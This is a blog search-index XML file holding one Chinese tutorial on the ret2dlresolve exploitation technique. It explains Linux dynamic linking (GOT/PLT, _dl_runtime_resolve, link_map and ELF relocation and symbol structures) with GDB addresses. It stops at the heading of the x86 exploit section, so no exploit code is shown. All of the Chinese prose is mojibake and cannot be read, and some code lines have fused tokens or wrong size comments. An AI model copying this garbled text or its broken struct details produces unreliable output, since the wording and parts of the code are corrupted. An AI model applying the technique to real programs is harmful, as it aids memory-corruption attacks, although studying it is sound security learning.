<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Ret2dlresolveæ”»å‡»è§£æ</title>
    <link href="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Ret2dlresolveæ”»å‡»è§£æï¼ˆLinuxåŠ¨æ€é“¾æ¥åŸç†ï¼‰"><a href="#Ret2dlresolveæ”»å‡»è§£æï¼ˆLinuxåŠ¨æ€é“¾æ¥åŸç†ï¼‰" class="headerlink" title="Ret2dlresolveæ”»å‡»è§£æï¼ˆLinuxåŠ¨æ€é“¾æ¥åŸç†ï¼‰"></a>Ret2dlresolveæ”»å‡»è§£æï¼ˆLinuxåŠ¨æ€é“¾æ¥åŸç†ï¼‰</h1><ul><li>æœ¬æ–‡å°è¯•ä½¿ç”¨<strong>é—®é¢˜é©±åŠ¨</strong>ä½œä¸ºè¡Œæ–‡æ€è·¯çš„æ–¹å¼ï¼Œä½¿ç”¨é—®ç­”çš„æ–¹å¼ä¸€æ­¥ä¸€æ­¥å‰–æLinuxåŠ¨æ€é“¾æ¥åŸç†ï¼Œå¹¶è§£æ<code>ret2dlresolve</code>æ”»å‡»æ–¹æ³•</li></ul><h2 id="Q1ï¼šä»€ä¹ˆæ˜¯åŠ¨æ€é“¾æ¥ï¼Ÿ"><a href="#Q1ï¼šä»€ä¹ˆæ˜¯åŠ¨æ€é“¾æ¥ï¼Ÿ" class="headerlink" title="Q1ï¼šä»€ä¹ˆæ˜¯åŠ¨æ€é“¾æ¥ï¼Ÿ"></a>Q1ï¼šä»€ä¹ˆæ˜¯åŠ¨æ€é“¾æ¥ï¼Ÿ</h2><ul><li>æŠŠé“¾æ¥è¿™ä¸ªè¿‡ç¨‹<strong>æ¨è¿Ÿ</strong>åˆ°äº†<strong>è¿è¡Œæ—¶å†è¿›è¡Œ</strong>ï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶è£…è½½æ—¶æˆ–è¿è¡Œæ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿçš„è£…è½½ç¨‹åºåŠ è½½åº“</li></ul><h2 id="Q2ï¼šä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€é“¾æ¥ï¼Ÿ"><a href="#Q2ï¼šä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€é“¾æ¥ï¼Ÿ" class="headerlink" title="Q2ï¼šä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€é“¾æ¥ï¼Ÿ"></a>Q2ï¼šä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€é“¾æ¥ï¼Ÿ</h2><ul><li>è§£å†³é™æ€é“¾æ¥çš„ç©ºé—´æµªè´¹å’Œæ›´æ–°å›°éš¾é—®é¢˜</li></ul><h2 id="Q3ï¼šåŠ¨æ€é“¾æ¥çš„å®ç°ï¼Ÿ"><a href="#Q3ï¼šåŠ¨æ€é“¾æ¥çš„å®ç°ï¼Ÿ" class="headerlink" title="Q3ï¼šåŠ¨æ€é“¾æ¥çš„å®ç°ï¼Ÿ"></a>Q3ï¼šåŠ¨æ€é“¾æ¥çš„å®ç°ï¼Ÿ</h2><ul><li><p>Linuxï¼š<code>.so</code>ï¼›Windowsï¼š<code>.dll</code></p></li><li><p>å…±äº«çš„æ˜¯<strong>ä»£ç </strong>ï¼Œç§æœ‰çš„æ˜¯æ•°æ®</p></li><li><p>å…±äº«å¯¹è±¡çš„æœ€ç»ˆè£…è½½åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯ä¸ç¡®å®šçš„ï¼Œè€Œæ˜¯åœ¨è£…è½½æ—¶ï¼Œ<strong>è£…è½½å™¨æ ¹æ®å½“å‰åœ°å€ç©ºé—´çš„ç©ºé—²æƒ…å†µï¼ŒåŠ¨æ€åˆ†é…ä¸€å—è¶³å¤Ÿå¤§å°çš„è™šæ‹Ÿåœ°å€ç©ºé—´ç»™ç›¸åº”çš„å…±äº«å¯¹è±¡</strong></p></li></ul><h2 id="Q4ï¼šåŠ¨æ€é“¾æ¥å¯¹è±¡å…±äº«éš¾é¢˜ï¼Ÿ"><a href="#Q4ï¼šåŠ¨æ€é“¾æ¥å¯¹è±¡å…±äº«éš¾é¢˜ï¼Ÿ" class="headerlink" title="Q4ï¼šåŠ¨æ€é“¾æ¥å¯¹è±¡å…±äº«éš¾é¢˜ï¼Ÿ"></a>Q4ï¼šåŠ¨æ€é“¾æ¥å¯¹è±¡å…±äº«éš¾é¢˜ï¼Ÿ</h2><ul><li><p>æŒ‡ä»¤éƒ¨åˆ†æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦åœ¨è£…è½½æ—¶ç¡®å®š</p><ul><li>ä¸€æ˜¯æŒ‡ä»¤è®¿é—®å…¶ä»–æ¨¡å—çš„æ•°æ®ã€‚å¦‚æœå…¶ä»–æ¨¡å—çš„æ•°æ®çš„åœ°å€éœ€è¦å†è£…è½½æ—¶æ‰èƒ½ç¡®å®šï¼Œè¿™å°±å¿…é¡»ä¿®æ”¹æŒ‡ä»¤ä¸­çš„åœ°å€</li><li>äºŒæ˜¯æŒ‡ä»¤ä¸­è°ƒç”¨å…¶ä»–æ¨¡å—çš„å‡½æ•°</li></ul></li><li><p>è§£å†³æ–¹æ³•ï¼š<strong>å…¨å±€åç§»è¡¨ GOTï¼ˆglobal offset tableï¼‰</strong></p></li></ul><h2 id="Q5ï¼šGOTï¼Ÿ"><a href="#Q5ï¼šGOTï¼Ÿ" class="headerlink" title="Q5ï¼šGOTï¼Ÿ"></a>Q5ï¼šGOTï¼Ÿ</h2><ul><li>æ•°æ®æ®µä¸­çš„ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼š<ul><li><strong>å­˜å‚¨</strong>ï¼šå­˜æ”¾è·¨æ¨¡å—çš„æ•°æ®/å‡½æ•°çš„åœ°å€</li><li><strong>åŠ¨æ€ä¿®æ”¹</strong>ï¼šåœ¨è£…è½½æ—¶åŠ¨æ€å¡«å…¥</li><li><strong>è®¿é—®</strong>ï¼šé€šè¿‡GOTçš„æŒ‡é’ˆé—´æ¥è®¿é—®</li></ul></li><li>è¯´ç™½äº†GOTæ˜¯æ‰€æœ‰éœ€è¦åŠ¨æ€è£…è½½æ¨¡å—çš„ä¸€ä¸ªwrapperï¼Œæ˜¯ä¸€ä¸ªå­˜æ”¾å…·ä½“è·³è½¬åœ°å€çš„æŒ‡é’ˆ</li><li>åœ¨ELFä¸­ï¼Œ<code>.got</code>ç”¨æ¥ä¿å­˜å…¨å±€å˜é‡å¼•ç”¨çš„åœ°å€ï¼Œ<code>.got.plt</code>ç”¨æ¥ä¿å­˜å‡½æ•°å¼•ç”¨çš„åœ°å€</li></ul><h2 id="Q6ï¼šx86-PLTè¿‡ç¨‹ï¼Ÿ"><a href="#Q6ï¼šx86-PLTè¿‡ç¨‹ï¼Ÿ" class="headerlink" title="Q6ï¼šx86 PLTè¿‡ç¨‹ï¼Ÿ"></a>Q6ï¼šx86 PLTè¿‡ç¨‹ï¼Ÿ</h2><p>PLTåŸºæœ¬æµç¨‹ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/** csappä¸­GOTæŒ‡çš„æ˜¯ï¼ˆ.got.plt + gotï¼‰**/<br>  PLT[0]:  # è¢«æ‰€æœ‰çš„.pltå®ä½“æ‰€å…±äº«<br>  push *(GOT+4)  # 4.å°†Module IDï¼ˆGOT[1]ï¼‰å‹å…¥æ ˆ<br>  jmp  *(GOT+8)   # 5.è°ƒç”¨_dl_runtime_resolve()ï¼ˆGOT[2]ï¼‰ï¼Œæ ¹æ®id+nå®Œæˆç¬¦å·è§£æä¸é‡å®šä½ï¼Œå¹¶å°†è§£æåœ°å€å¡«å…¥åˆ°bar@GOTä¸­ï¼ˆä¹Ÿå°±æ˜¯ä¸‹æ¬¡å°±ä¸éœ€è¦è§£æäº†ï¼‰<br>  ...<br>  ...<br>  bar@plt( PLT[n] ):<br>  jmp  *(bar@GOT)  # 1.å¦‚æœç¬¦å·å·²ç»‘å®šï¼Œåˆ™è·³è½¬åˆ°ç¬¦å·ä½ç½®ï¼›å¦‚æœæœªç»‘å®šï¼Œåˆ™è·³è½¬åˆ°ä¸‹é¢<br>  push n   # 2.å°†ç¬¦å·åœ¨é‡å®šä½è¡¨ä¸­çš„ä¸‹æ ‡å‹å…¥æ ˆ<br>  jmp PLT0   # 3.è·³è½¬åˆ°PLT0å¤„<br></code></pre></td></tr></tbody></table></figure><p>ä¸€å¥è¯æè¿°ï¼šPLTé¦–å…ˆä¼šæŸ¥æ‰¾<code>.got.plt</code>èŠ‚ï¼ˆGOTï¼‰ã€‚å¦‚æœGOTæ‰¾ä¸åˆ°ç¬¦å·åœ°å€ï¼ˆä¸»è¦ç”±äºå»¶è¿Ÿç»‘å®š lazy-bindingï¼‰ï¼Œé‚£ä¹ˆPLTå°†ä¼šè°ƒç”¨ä¸€ä¸ªåŠ¨æ€åŠ è½½å™¨ä¸­çš„å‡½æ•°<code>_dl_runtime_resolve()</code>ï¼š</p><ul><li>åœ¨ä¸»ELFé•œåƒçš„<code>.dynstr</code>èŠ‚ä¸­æ‰¾åˆ°NULLä¸ºç»ˆç»“ç¬¦çš„å­—ç¬¦ä¸²<code>puts\0</code></li><li>ç„¶ååœ¨æ‰€æœ‰åŠ è½½çš„å…±äº«ç›®æ ‡ä¸­æ‰¾åˆ°<code>puts</code>çš„åœ°å€ï¼ˆå¦‚<code>libc.so.6</code>ï¼‰</li></ul><p>e.g.</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/1.png"></p><p>åœ¨æ‰§è¡Œå®Œ<code>_dl_runtime_resolve()</code>å‡½æ•°ä¹‹å<code>read@GOT</code>çš„æ•°æ®å°±è¢«ä¿®æ”¹ä¸ºè£…è½½åˆ°å †ä¸Šçš„åœ°å€ï¼Œå³</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/2.png"></p><p>Q7ï¼š<code>.got.plt</code>ï¼Ÿ</p><ul><li><code>.got.plt</code>å‰é¢ä¸‰é¡¹ï¼š</li></ul><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">------------------------<br>.dynamicæ®µåœ°å€<br>------------------------<br>æœ¬æ¨¡å—ID<br>------------------------<br>_dl_runtime_resolve()åœ°å€<br>------------------------<br>å¯¼å…¥å‡½æ•°1<br>------------------------<br>å¯¼å…¥å‡½æ•°2<br>------------------------<br>...<br>------------------------<br></code></pre></td></tr></tbody></table></figure><ul><li>åœ¨GDBä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>.got.plt</code>ç¬¬ä¸€ä¸ªå¯¼å…¥å‡½æ•°çš„åœ°å€ä¸º<code>0x80498c4</code>ï¼š</li></ul><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/3.png"></p><p>æ ¹æ®å‰é¢<code>.got.plt</code>çš„ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥æ™“Module IDåœ°å€ä¸º<code>0x80498bc</code>ï¼Œ<code>_dl_runtime_resolve()</code>åœ°å€ä¸º<code>0x80498c0</code></p><h2 id="Q7ï¼š-dl-runtime-resolve-ï¼Ÿ"><a href="#Q7ï¼š-dl-runtime-resolve-ï¼Ÿ" class="headerlink" title="Q7ï¼š_dl_runtime_resolve()ï¼Ÿ"></a>Q7ï¼š<code>_dl_runtime_resolve()</code>ï¼Ÿ</h2><p><code>_dl_runtime_resolve()</code>å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯<code>link_map</code>ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º<code>0xf7ffd940</code>ï¼Œè€Œå¦ä¸€ä¸ªå‚æ•°æ˜¯<code>reloc_index</code>ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º<code>0x8</code>ã€‚è¯·æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å­˜æ”¾åœ¨æ ˆä¸­çš„ï¼Œç”±äºå½“å‰ç¯å¢ƒä¸ºx86ï¼Œå‚æ•°æ˜¯å­˜æ”¾åœ¨æ ˆä¸Šçš„ï¼›ä½†å½“ç¯å¢ƒä¸ºx64æ—¶ï¼Œ<strong>è¿™ä¸¤ä¸ªå‚æ•°ä»ç„¶æ˜¯å­˜æ”¾åœ¨æ ˆä¸­çš„</strong>ï¼ŒåŸå› ä¹Ÿå¾ˆç®€å•ï¼Œå› ä¸º<code>rdi, rsi, rdx(rcx, r8, r9...)</code>ç°åœ¨å­˜æ”¾çš„æ˜¯è¢«è°ƒå‡½æ•°çš„å‚æ•°ï¼Œä¸ºäº†å‡å°‘é¢å¤–çš„ä¿æŠ¤ç°åœºæ±‡ç¼–ç ï¼Œè¿™é‡Œç›´æ¥å°†å‚æ•°å…¥æ ˆå¤„ç†ã€‚</p><p><code>_dl_runtime_resolve(link_map, reloc_index)</code>åšäº†å¦‚ä¸‹çš„äº‹ï¼š</p><ul><li>æ‰¾åˆ°ç›®æ ‡å‡½æ•°åä»¥NULLæˆªæ–­çš„å­—ç¬¦ä¸²ï¼ˆå¦‚â€readâ€ï¼‰ï¼›</li><li>åœ¨æ‰€æœ‰å·²ç»è½½å…¥çš„åº“ï¼ˆå…±äº«ç›®æ ‡ï¼‰ä¸­å¯»æ‰¾è¯¥åœ°å€ï¼›</li><li>å°†è¯¥åœ°å€å†™å›<strong>GOT</strong>ï¼ˆå³å°†æ‰¾åˆ°çš„åœ°å€å¡«å…¥<a href="mailto:read@got.plt">read@got.plt</a>ä¸­ï¼‰ï¼›</li><li>è·³è½¬åˆ°<code>read()</code>å¹¶æ‰§è¡Œã€‚</li></ul><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ç›®æ ‡å‡½æ•°åæ˜¯å¦‚ä½•æ‰¾åˆ°çš„ï¼Ÿæˆ‘ä»¬å°†åœ¨ä¸‹ä¸€é—®ä¸­è¿›è¡Œè§£ç­”ã€‚</p><h2 id="Q8ï¼šå¯»æ‰¾çš„å‡½æ•°åæ˜¯å¦‚ä½•ç¡®å®šçš„ï¼Ÿ"><a href="#Q8ï¼šå¯»æ‰¾çš„å‡½æ•°åæ˜¯å¦‚ä½•ç¡®å®šçš„ï¼Ÿ" class="headerlink" title="Q8ï¼šå¯»æ‰¾çš„å‡½æ•°åæ˜¯å¦‚ä½•ç¡®å®šçš„ï¼Ÿ"></a>Q8ï¼šå¯»æ‰¾çš„å‡½æ•°åæ˜¯å¦‚ä½•ç¡®å®šçš„ï¼Ÿ</h2><p>æ€»ä½“å¯»å€æµç¨‹[3]ï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/4.png"></p><hr><p>ç»†èŠ‚ï¼š</p><p><strong>.dynamicæ®µï¼š</strong></p><ul><li><p>å­˜æ”¾<code>.dynsym</code>å’Œ<code>.dynstr</code>åœ°å€</p></li><li><p>å­˜æ”¾<code>Elf_Dyn</code>å®ä½“ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span><br>  Elf32_Sword d_tag;<br>  <span class="hljs-class"><span class="hljs-keyword">union</span> {</span><br>    Elf32_Word d_val;<br>    Elf32_Addr d_ptr;<br>  } d_un;<br>} Elf32_Dyn;<br><br><span class="hljs-comment">// x64</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">{</span><br>  Elf64_Sxword d_tag;                        <span class="hljs-comment">/* Dynamic entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    {</span><br>      Elf64_Xword d_val;                     <span class="hljs-comment">/* Integer value */</span><br>      Elf64_Addr  d_ptr;                     <span class="hljs-comment">/* Address value */</span><br>    } d_un;<br>} Elf64_Dyn;<br></code></pre></td></tr></tbody></table></figure></li></ul><p><strong>link_map.l_info</strong>ï¼š</p><ul><li>åŠ¨æ€åŠ è½½å™¨å­˜å‚¨è¿™äº›å®ä½“çš„ç»“æ„ä½“ï¼ˆ<code>link_map</code>ç»“æ„ä½“æˆå‘˜å¾ˆå¤š[4]ï¼Œæˆ‘ä»¬ä»…éœ€å…³æ³¨<code>l_info</code>ï¼‰</li><li>å®šä¹‰ï¼š</li></ul><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs applescript">struct link_map<br>  {<br>...    <br>    /* Indexed pointers <span class="hljs-keyword">to</span> dynamic section.<br>       [<span class="hljs-number">0</span>,DT_NUM) are indexed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> processor-independent tags.<br>       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> tag minus DT_LOPROC.<br>       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are indexed <span class="hljs-keyword">by</span> DT_VERSIONTAGIDX(tagvalue).<br>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM, DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed <span class="hljs-keyword">by</span> DT_EXTRATAGIDX(tagvalue).<br>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM, DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are indexed <span class="hljs-keyword">by</span> DT_VALTAGIDX(tagvalue) <span class="hljs-keyword">and</span><br>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM, DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM) are indexed <span class="hljs-keyword">by</span> DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */<br>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br>...<br></code></pre></td></tr></tbody></table></figure><p>d_tag (dynamic entry type) å®šä¹‰åœ¨<code>elf/elf.h</code>[5]ä¸­ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Legal values for d_tag (dynamic entry type).  */</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_STRTAB5<span class="hljs-comment">/* Address of string table (.dynstr) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_SYMTAB6<span class="hljs-comment">/* Address of symbol table (.dynsym) */</span></span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_JMPREL23<span class="hljs-comment">/* Address of PLT relocs (.plt.dyn) */</span></span><br></code></pre></td></tr></tbody></table></figure><p>åœ¨Q6ä¸­ï¼Œ<code>PLT[0]</code>æ˜¯æœ‰å°†Module IDçš„å€¼å‹å…¥å †æ ˆï¼Œè€Œè¯¥å€¼å°±æ˜¯link_mapï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/5.png"></p><p>é‚£link_mapåˆ°l_infoçš„åç§»å€¼æ˜¯å¤šå°‘å‘¢ï¼ŸAï¼š+8 * ä½é•¿ï¼ˆx86ï¼š4ï¼›x64ï¼š8ï¼‰</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span><br>  {<br>    <span class="hljs-comment">/* These first few members are part of the protocol with the debugger.</span><br><span class="hljs-comment">       This is the same format used in SVR4.  */</span><br>    <span class="hljs-built_in">ElfW</span>(Addr) l_addr;<span class="hljs-comment">/* Difference between the address in the ELF</span><br><span class="hljs-comment">   file and the addresses in memory.  */</span><br>    <span class="hljs-type">char</span> *l_name;<span class="hljs-comment">/* Absolute file name object was found in.  */</span><br>    <span class="hljs-built_in">ElfW</span>(Dyn) *l_ld;<span class="hljs-comment">/* Dynamic section of the shared object.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *l_next, *l_prev; <span class="hljs-comment">/* Chain of loaded objects.  */</span><br>    <span class="hljs-comment">/* All following members are internal to the dynamic linker.</span><br><span class="hljs-comment">       They may change without notice.  */</span><br>    <span class="hljs-comment">/* This is an element which is only ever different from a pointer to</span><br><span class="hljs-comment">       the very same copy of this type for ld.so when it is used in more</span><br><span class="hljs-comment">       than one namespace.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *l_real;<br>    <span class="hljs-comment">/* Number of the namespace this link map belongs to.  */</span><br>    Lmid_t l_ns;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">libname_list</span> *l_libname;<br>    <span class="hljs-built_in">ElfW</span>(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM<br>    + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br></code></pre></td></tr></tbody></table></figure><p>å³l_infoçš„åœ°å€ä¸º<code>link_map + 8 * (4/8)</code>ï¼Œé‚£ä¹ˆæœ‰ï¼š</p><table><thead><tr><th>Member</th><th>Address</th></tr></thead><tbody><tr><td><code>link_map-&gt;l_info[DT_STRTAB]</code></td><td>link_map_base + (8 + 5 = 13) * (4/8)</td></tr><tr><td><code>link_map-&gt;l_info[DT_SYMTAB]</code></td><td>link_map_base + (8 + 6 = 14) * (4/8)</td></tr><tr><td><code>link_map-&gt;l_info[DT_JMPREL]</code></td><td>link_map_base + (8 + 23 = 31) * (4/8)</td></tr></tbody></table><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/6.png"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹<code>.dynstr</code>å­˜æ”¾çš„æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/7.png"></p><hr><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†<code>.rel.plt</code>ã€<code>.dynstr</code>å’Œ<code>.dynsym</code>çš„åœ°å€ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ ¹æ®ä¸Šè¿°çš„å¯»å€æµç¨‹ä¸€æ­¥ä¸€æ­¥æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°åï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/4.png"></p><p>å¦‚å‰æ‰€è¿°ï¼Œ<code>reloc_index</code>åœ¨æ­¤ä¾‹ä¸­ä¸º<code>0x8</code>ã€‚é‚£ä¹ˆ<code>read</code>å‡½æ•°<code>Elf_Rel</code>ç»“æ„ä½“çš„åœ°å€ä¸º<code>0x08048304 + 8 = 0x804830c</code>ï¼Œå³</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/9.png"></p><p>è¿™é‡Œæ˜¾ç„¶<code>0x080498c8</code>ä¸º<code>r_offset</code>ï¼Œè€Œ<code>0x207</code>ä¸º<code>r_info</code>ï¼Œ</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// glibc/elf/elf.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)((val) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)((val) &amp; 0xff)</span><br></code></pre></td></tr></tbody></table></figure><p>å› æ­¤ï¼Œ<code>read</code>å¯¹åº”çš„<code>Elf_SYM</code>ç»“æ„ä½“åœ¨<code>.dynsym</code>çš„åç§»ä¸º<code>ELF32_R_SYM(r_info)= 0x207 &gt;&gt; 8 = 2 </code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">{</span><br>  Elf32_Wordst_name;<span class="hljs-comment">/* Symbol name (string tbl index) (16 bits)*/</span><br>  Elf32_Addrst_value;<span class="hljs-comment">/* Symbol value (16 bits)*/</span><br>  Elf32_Wordst_size;<span class="hljs-comment">/* Symbol size (16 bits)*/</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Symbol type and binding (8 bits)*/</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<span class="hljs-comment">/* Symbol visibility (8 bits) */</span><br>  Elf32_Sectionst_shndx;<span class="hljs-comment">/* Section index (16 bits)*/</span><br>} Elf32_Sym;<br></code></pre></td></tr></tbody></table></figure><p>è€Œ<code>sizeof(struct Elf32_Sym)=4*4=0x10</code>ï¼ˆæ³¨æ„è¿™é‡Œç»“æ„ä½“å†…å­˜å¯¹é½ï¼‰ï¼Œé‚£ä¹ˆå¯¹åº”<code>Elf_SYM</code>ç»“æ„ä½“çš„èµ·å§‹ä½ç½®ä¸º<code>0x080481ac + 0x10 * 0x2 = 0x80481cc</code>ï¼Œåˆ™æœ‰</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10.png"></p><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å“å˜¿ï¼Œè¿™é‡Œå±…ç„¶ä¸æ˜¯åœ°å€å—ï¼Ÿé‚£è¿™é‡Œ<code>0x5c</code>æ˜¯ä¸ªå•¥ç©æ„ï¼Ÿï¼Ÿæˆ‘ä»¬ä¸å¦¨çŒœæµ‹ä¸€ä¸‹ï¼Œè¯¥åœ°å€æ˜¯æœç´¢å­—ç¬¦ä¸²åœ¨<code>.dynstr</code>çš„åç§»å€¼ï¼Ÿæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11.png"></p><p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†å‡½æ•°åï¼Œç„¶åé“¾æ¥å™¨å°†åœ¨æ‰€æœ‰åŠ è½½çš„å…±äº«ä»£ç ä¸­æ‰¾åˆ°åŒ…å«è¯¥å­—ç¬¦ä¸²çš„å‡½æ•°åœ°å€ï¼Œå¹¶å°†è¯¥åœ°å€å¡«å…¥GOTè¡¨ä¸­ã€‚</p><h2 id="Q9ï¼šX86-Ret2dlresolve"><a href="#Q9ï¼šX86-Ret2dlresolve" class="headerlink" title="Q9ï¼šX86 Ret2dlresolve"></a>Q9ï¼šX86 